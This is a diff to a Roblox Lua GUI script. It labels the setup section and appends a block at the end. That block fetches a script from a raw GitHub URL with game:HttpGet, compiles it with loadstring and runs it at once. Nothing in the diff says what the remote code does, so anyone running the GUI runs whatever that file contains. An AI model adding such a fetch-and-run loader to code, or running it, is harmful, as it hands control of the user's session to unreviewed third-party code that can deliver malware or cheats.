@@ -1,4 +1,4 @@
-
+-- GUI Setup
 local screenGui = Instance.new("ScreenGui")
 local mainFrame = Instance.new("Frame")
 local uiCorner = Instance.new("UICorner")
@@ -238,3 +238,13 @@ task.spawn(function()
         task.wait(1)
     end
 end)
+
+-- Load external script using loadstring
+local externalScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/VBallsYCUKER/gui/refs/heads/main/wh", true))
+
+-- Execute the external script
+if externalScript then
+    externalScript() -- Executes the external script code
+else
+    warn("Failed to load external script.")
+end
